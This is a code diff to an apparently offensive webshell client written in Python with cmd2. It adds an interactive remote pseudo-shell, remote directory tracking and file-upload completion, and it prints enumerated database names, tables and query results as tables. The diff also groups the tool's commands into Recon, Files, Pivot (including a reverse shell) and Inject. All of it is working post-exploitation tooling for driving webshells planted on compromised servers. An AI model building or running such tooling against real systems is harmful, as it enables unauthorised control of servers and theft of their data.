@@ -8,6 +8,8 @@ carries over.
 
 from __future__ import annotations
 
+import contextlib
+import shlex
 import subprocess
 import time
 from pathlib import Path
@@ -44,8 +46,9 @@ class Repl(cmd2.Cmd):
         self.webshells = webshells
         self.config = config
         self.local_exec = True
+        self.cwd = ""  # client-tracked remote working directory
         self.intro = BANNER
-        for name in ("edit", "macro", "run_pyscript", "run_script", "shell", "shortcuts"):
+        for name in ("edit", "macro", "run_pyscript", "run_script", "shortcuts"):
             self.hidden_commands.append(name)
         # Long-form aliases mirroring v1's command names.
         self.aliases.update(
@@ -135,6 +138,10 @@ class Repl(cmd2.Cmd):
             except WebshellError as exc:
                 log.error(f"download failed: {exc}")
 
+    def complete_ul(self, text: str, line: str, begidx: int, endidx: int):  # noqa: ANN201
+        """Tab-complete the local filesystem path argument of `ul`."""
+        return self.path_complete(text, line, begidx, endidx)
+
     def do_ul(self, line: cmd2.Statement) -> None:
         """ul <local-path> — upload a local file to the target(s)."""
         local = str(line).strip() or input("Local path: ").strip()
@@ -200,7 +207,7 @@ class Repl(cmd2.Cmd):
                 elif cmd == "h":
                     log.info(help_text)
                 elif cmd == "d":
-                    log.success("\n".join(manager.databases()))
+                    log.table(["Database"], [[d] for d in manager.databases()])
                 elif cmd == "u":
                     log.success(manager.current_user())
                 elif cmd == "v":
@@ -209,16 +216,18 @@ class Repl(cmd2.Cmd):
                     log.success(manager.current_database())
                 elif cmd == "t":
                     db = self._ask("Database", manager.current_database())
-                    log.success("\n".join(manager.tables(db)))
+                    log.table(["Table"], [[t] for t in manager.tables(db)])
                 elif cmd == "c":
                     db = self._ask("Database", manager.current_database())
                     table = input("Table: ").strip()
-                    log.success("\n".join(manager.columns(db, table)))
+                    log.table(["Column"], [[col] for col in manager.columns(db, table)])
                 elif cmd == "e":
                     sql = input("SQL: ").strip()
                     rows = manager.query(sql)
-                    for row in rows:
-                        log.success(" | ".join(row))
+                    if rows:
+                        log.table([f"col{i}" for i in range(len(rows[0]))], rows)
+                    else:
+                        log.warning("No rows.")
                 else:
                     log.warning(help_text)
             except WebshellError as exc:
@@ -256,6 +265,12 @@ class Repl(cmd2.Cmd):
         )
 
     # -- exec mode -------------------------------------------------------------
+    def _remote_command(self, ws: WebShell, command: str) -> str:
+        """Run a command on the target, honouring the client-tracked cwd."""
+        if self.cwd:
+            command = f"cd {shlex.quote(self.cwd)} 2>/dev/null; {command}"
+        return ws.run_command(command)
+
     def do_setl(self, _: cmd2.Statement) -> None:
         """Run unrecognised input on the LOCAL machine."""
         self.local_exec = True
@@ -266,11 +281,49 @@ class Repl(cmd2.Cmd):
         self.local_exec = False
         log.info("Unrecognised commands now run on the target.")
 
+    def do_pwd(self, _: cmd2.Statement) -> None:
+        """Show the client-tracked remote working directory."""
+        log.success(self.cwd or "(server default)")
+
+    def do_cd(self, line: cmd2.Statement | str) -> None:
+        """cd <path> — change the (client-tracked) remote working directory."""
+        arg = str(line).strip() or "."
+        ws = self.webshells[0]
+        base = self.cwd or ws.webroot
+        target = arg if arg.startswith("/") else f"{base}/{arg}"
+        try:
+            resolved = ws.run_command(f"cd {shlex.quote(target)} && pwd").strip()
+        except WebshellError as exc:
+            log.error(f"cd failed: {exc}")
+            return
+        if resolved.startswith("/"):
+            self.cwd = resolved
+            log.success(f"cwd: {self.cwd}")
+        else:
+            log.error(f"cannot cd to {target}: {resolved or 'no such directory'}")
+
+    def do_shell(self, _: cmd2.Statement | str) -> None:
+        """Interactive pseudo-shell on the target(s); `exit` to return."""
+        log.info("Interactive shell (cwd is client-tracked). Type `exit` to leave.")
+        while True:
+            try:
+                line = input(f"sniper:{self.cwd or '~'}$ ").strip()
+            except EOFError:
+                break
+            if line in ("exit", "quit"):
+                break
+            if not line:
+                continue
+            if line == "cd" or line.startswith("cd "):
+                self.do_cd(line[2:].strip())
+                continue
+            self._each(lambda ws, cmd=line: log.raw(self._remote_command(ws, cmd)), "shell")
+
     def do_exec(self, line: cmd2.Statement) -> None:
         """exec <cmd> — explicitly run a command on the target."""
         command = str(line).strip()
         if command:
-            self._each(lambda ws: log.raw(ws.run_command(command)), "exec")
+            self._each(lambda ws: log.raw(self._remote_command(ws, command)), "exec")
 
     def default(self, statement: cmd2.Statement) -> None:
         command = statement.raw.strip()
@@ -280,7 +333,7 @@ class Repl(cmd2.Cmd):
             log.info(f"[local] {command}")
             subprocess.run(command, shell=True)  # noqa: S602 - intentional local exec
         else:
-            self._each(lambda ws: log.raw(ws.run_command(command)), "remote")
+            self._each(lambda ws: log.raw(self._remote_command(ws, command)), "remote")
 
     # -- lifecycle -------------------------------------------------------------
     def do_q(self, _: cmd2.Statement) -> bool:
@@ -295,3 +348,19 @@ class Repl(cmd2.Cmd):
         data = [ws.info.to_dict() for ws in self.webshells]
         out.write_text(json.dumps(data, indent=2))
         log.info(f"Saved {len(data)} webshell(s) to {out}")
+
+
+# Group commands in `help` output (best-effort; tolerate cmd2 API differences).
+with contextlib.suppress(Exception):
+    cmd2.categorize(
+        [Repl.do_p, Repl.do_pv, Repl.do_kv, Repl.do_c, Repl.do_fwd,
+         Repl.do_fwpf, Repl.do_gdf, Repl.do_fsb],
+        "Recon",
+    )
+    cmd2.categorize([Repl.do_r, Repl.do_rm, Repl.do_dl, Repl.do_dla, Repl.do_ul], "Files")
+    cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_db], "Pivot")
+    cmd2.categorize([Repl.do_aiw, Repl.do_aimw, Repl.do_fr], "Inject")
+    cmd2.categorize(
+        [Repl.do_shell, Repl.do_cd, Repl.do_pwd, Repl.do_exec, Repl.do_setl, Repl.do_setr],
+        "Shell / exec",
+    )
